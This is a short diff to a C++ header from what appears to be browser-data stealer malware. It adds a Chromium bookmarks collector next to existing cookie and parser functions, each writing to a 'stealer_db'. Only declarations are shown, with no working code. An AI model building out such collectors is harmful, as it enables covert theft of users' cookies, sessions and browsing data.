@@ -8,5 +8,6 @@
 
 BOOL chromium_parser(std::string username, std::string stealer_db);
 BOOL chromium_cookie_collector(std::string username, std::string stealer_db);
+BOOL chromium_bookmarks_collector(std::string username, std::string stealer_db);
 
 #endif /* CHROMIUMPARSER_H */
